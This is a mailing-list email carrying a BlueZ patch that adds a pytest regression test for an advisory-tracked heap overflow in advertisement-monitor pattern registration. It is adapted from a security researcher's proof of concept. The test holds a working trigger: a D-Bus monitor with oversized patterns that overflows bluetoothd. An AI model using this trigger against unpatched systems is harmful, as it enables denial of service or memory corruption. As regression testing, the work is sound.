Received: from meesny.iki.fi (meesny.iki.fi [195.140.195.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 27FBA36E477
	for <linux-bluetooth@vger.kernel.org>; Sun,  6 Sep 2026 16:50:45 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=195.140.195.201
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788713450; cv=pass; b=ci/DHg4OdeQRpbbZ0VrhafT8janVjJKZkvAw9eZUdPyHqZuLeVnY0WLhT1B17qcAodLdrLXKs/frAYGyK/rSjlS6m4zMBawbTTFQ9zf9lQjzpTYm0HX+wVGnU3RdK3TP+Q9L5S5zcgDPYljHzLcy8/TNaaASbgww+IzlIffnTeE=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788713450; c=relaxed/simple;
	bh=o8myYuH7bstmkdwKaEFzAHfEdJbukcoiskLvzSYH6mE=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=hyhyr5RATMgFc2miuQscci+woiJC4m41PcgRgO58HfpHyA+1qfT8mcffiLA9cjwtFeCxiR7n9ECtkjcuUvT6Pq8HRK1K6Uklisw65HFXu5CgG0GpLyDY6UAvCExrLN85tFHE+C/XP3v53OqnRNi35jJEsC92XHijby5FM2xSbdM=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi; spf=pass smtp.mailfrom=iki.fi; dkim=pass (1024-bit key) header.d=iki.fi header.i=@iki.fi header.b=AvqmKt88; arc=pass smtp.client-ip=195.140.195.201
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=iki.fi
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=iki.fi
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=iki.fi header.i=@iki.fi header.b="AvqmKt88"
Received: from monolith.lan (unknown [IPv6:2a02:ed04:3581:2::d001])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange x25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	(Authenticated sender: pav)
	by meesny.iki.fi (Postfix) with ESMTPSA id 4hdGRF5j0kzyPr;
	Sun, 06 Sep 2026 19:50:33 +0300 (EEST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi; s=meesny;
	t=1788713434;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=F8/JXIdvW+x/BMWiXozOnq9t6n7VNq4hV5vCWTpsx64=;
	b=AvqmKt88uSUcvkbcR0wI2VyrAHLJiCY0Ql32JW1dHRgIJYD4+tAhsRiQUmKImFwPF+574t
	m34EDlAjxwxzXawQFBVQF3uBMllEkGRsEvL6852vmsheoIoOQOYGbzh8OX8l7+UvqR93vR
	MXZLwt3fMO0AYzzaE65X1z+rW7PA4Ug=
ARC-Seal: i=1; a=rsa-sha256; d=iki.fi; s=meesny; cv=none; t=1788713434;
	b=k8jNvf6Fo2mVri5auLS36KSHgKoVS1qx8T2C/V4bQKZJHf9/ZOmfp0vaYZtSHHi/wJ+C7F
	W6F/BS60BCsPsAhgAhAsx9n+c/JLIl6aF3ZjFkcZAYbuc5KGT5rHTmyf5ty5RIfGS1OJm6
	cicGh2ASD9LoAYOiGm5KbBba1TXZOvM=
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi;
	s=meesny; t=1788713434;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:
	 content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:in-reply-to:references:references;
	bh=F8/JXIdvW+x/BMWiXozOnq9t6n7VNq4hV5vCWTpsx64=;
	b=pMMAYYnJ+jYckvvv4IxxGQXwkCabO6zwFG48hzl8mRIrpAGc6hpAaaVSeXlKqv8+DxbMdr
	7Z3t2WwhyUzzSdvqY/RER+dOudJZR6TbK6cZj88eAN8TU6b4gH85e24Vx/0uDH2Pw5BpBh
	Sf93XwAt/wPtbBwy5weMZ9LR/mpVbW8=
ARC-Authentication-Results: i=1;
	ORIGINATING;
	auth=pass smtp.auth=pav smtp.mailfrom=pav@iki.fi
From: Pauli Virtanen <pav@iki.fi>
To: linux-bluetooth@vger.kernel.org
Cc: Pauli Virtanen <pav@iki.fi>
Subject: [PATCH BlueZ v7 8/9] test: functional: add test for adv_monitor crash
Date: Sun,  6 Sep 2026 19:49:50 +0300
Message-ID: <13f949e145a25f23408ca84023d079dfd9a19ad6.1788712996.git.pav@iki.fi>
X-Mailer: git-send-email 2.55.0
In-Reply-To: <cover.1788712996.git.pav@iki.fi>
References: <cover.1788712996.git.pav@iki.fi>
Precedence: bulk
X-Mailing-List: linux-bluetooth@vger.kernel.org
List-Id: <linux-bluetooth.vger.kernel.org>
List-Subscribe: <mailto:linux-bluetooth+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-bluetooth+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Add test checking adv_monitor overflow crash.
From PoC provided by Alexandro Calo' (Nozomi Networks Labs)
---
 test/functional/conftest.py         |   6 ++
 test/functional/test_adv_monitor.py | 123 ++++++++++++++++++++++++++++
 test/pytest.ini                     |   1 +
 3 files changed, 130 insertions(+)
 create mode 100644 test/functional/test_adv_monitor.py

diff --git a/test/functional/conftest.py b/test/functional/conftest.py
index bd26b7e4f..9e3f6c50d 100644
--- a/test/functional/conftest.py
+++ b/test/functional/conftest.py
@@ -50,9 +50,15 @@ def pytest_collection_finish(session):
 
 @pytest.hookimpl()
 def pytest_collection_modifyitems(session, config, items):
+    sa_re = re.compile(r"_GHSA_...._...._....")
+
     for item in items:
         callspec = getattr(item, "callspec", None)
 
         # Add vm mark to VM-using tests
         if callspec is not None and callspec.params.get("vm_setup", None) is not None:
             item.add_marker(pytest.mark.vm)
+
+        # Add security advisory marks based on test name
+        if sa_re.search(item.name):
+            item.add_marker(pytest.mark.sa)
diff --git a/test/functional/test_adv_monitor.py b/test/functional/test_adv_monitor.py
new file mode 100644
index 000000000..e7f109314
--- /dev/null
+++ b/test/functional/test_adv_monitor.py
@@ -0,0 +1,123 @@
+# -*- coding: utf-8; mode: python; eval: (blacken-mode); -*-
+# SPDX-License-Identifier: LGPL-2.1-or-later
+import dbus
+import dbus.service
+import pytest
+
+from pytest_bluezenv import host_config, Bluetoothd, wait_until, mainloop_wrap, get_dbus
+
+
+@host_config([Bluetoothd(conf="[General]\nExperimental = true")])
+def test_adv_monitor_GHSA_hhgc_hfgf_8m4x(hosts):
+    assert hosts[0].call(check_adv_monitor_GHSA_hhgc_hfgf_8m4x)
+
+
+def check_adv_monitor_GHSA_hhgc_hfgf_8m4x(adapter="/org/bluez/hci0"):
+    """NN-2026-0142 - Heap overflow via uint8 cp_len truncation in
+    adv_monitor pattern registration (src/adv_monitor.c:1113-1125).
+    """
+
+    NUM_PATTERNS = 8
+    PATTERN_SIZE = 34
+    OBSERVE_SECS = 5.0
+    APP_ROOT = "/NN20260142"
+
+    def make_patterns():
+        return dbus.Array(
+            [
+                dbus.Struct(
+                    (
+                        dbus.Byte(0),
+                        dbus.Byte(0xFF),
+                        dbus.Array([dbus.Byte(0x41)] * 31, signature="y"),
+                    ),
+                    signature="yyay",
+                )
+                for _ in range(NUM_PATTERNS)
+            ],
+            signature="(yyay)",
+        )
+
+    class Monitor(dbus.service.Object):
+        def __init__(self, bus, path, patterns):
+            super().__init__(bus, path)
+            self.patterns = patterns
+
+        @dbus.service.method(
+            "org.freedesktop.DBus.Properties", in_signature="s", out_signature="a{sv}"
+        )
+        def GetAll(self, iface):
+            return {
+                "Type": dbus.String("or_patterns"),
+                "Patterns": self.patterns,
+            }
+
+        @dbus.service.method("org.bluez.AdvertisementMonitor1")
+        def Release(self):
+            print("[*] monitor released")
+
+        @dbus.service.method("org.bluez.AdvertisementMonitor1")
+        def Activate(self):
+            print(
+                "[+] monitor activated (overflow already happened in "
+                "the ADD_ADV_PATTERNS_MONITOR mgmt call)"
+            )
+
+    class App(dbus.service.Object):
+        def __init__(self, bus, path, patterns):
+            super().__init__(bus, path)
+            self.monitor_path = dbus.ObjectPath(path + "/monitor0")
+            self.monitor = Monitor(bus, self.monitor_path, patterns)
+
+        @dbus.service.method(
+            "org.freedesktop.DBus.ObjectManager", out_signature="a{oa{sa{sv}}}"
+        )
+        def GetManagedObjects(self):
+            return {
+                self.monitor_path: {
+                    "org.bluez.AdvertisementMonitor1": self.monitor.GetAll(
+                        "org.bluez.AdvertisementMonitor1"
+                    )
+                }
+            }
+
+    success = None
+
+    def register_ok():
+        nonlocal success
+        print("[+] RegisterMonitor returned", flush=True)
+        success = True
+
+    def register_err(exc):
+        nonlocal success
+        print("[*] RegisterMonitor error:", exc, flush=True)
+        success = False
+
+    @mainloop_wrap
+    def start_register():
+        bus = get_dbus()
+
+        app = App(bus, APP_ROOT, make_patterns())
+        mgr = dbus.Interface(
+            bus.get_object("org.bluez", adapter),
+            "org.bluez.AdvertisementMonitorManager1",
+        )
+
+        cp_len = (1 + NUM_PATTERNS * PATTERN_SIZE) & 0xFF
+        total_len = 1 + NUM_PATTERNS * PATTERN_SIZE
+        print(
+            "[*] RegisterMonitor with %d patterns: cp_len=%d total=%d"
+            % (NUM_PATTERNS, cp_len, total_len),
+            flush=True,
+        )
+        mgr.RegisterMonitor(
+            dbus.ObjectPath(APP_ROOT),
+            reply_handler=register_ok,
+            error_handler=register_err,
+        )
+
+    start_register()
+
+    wait_until(lambda: success is not None, timeout=OBSERVE_SECS)
+
+    return success
diff --git a/test/pytest.ini b/test/pytest.ini
index 6b97c6525..8e4c109bb 100644
--- a/test/pytest.ini
+++ b/test/pytest.ini
@@ -5,6 +5,7 @@ log_level = 0
 log_file = test-functional.log
 markers =
     vm: tests requiring VM image
+    sa: security advisory regression tests
     tester: kernel testers
 
 addopts =
-- 
2.55.0

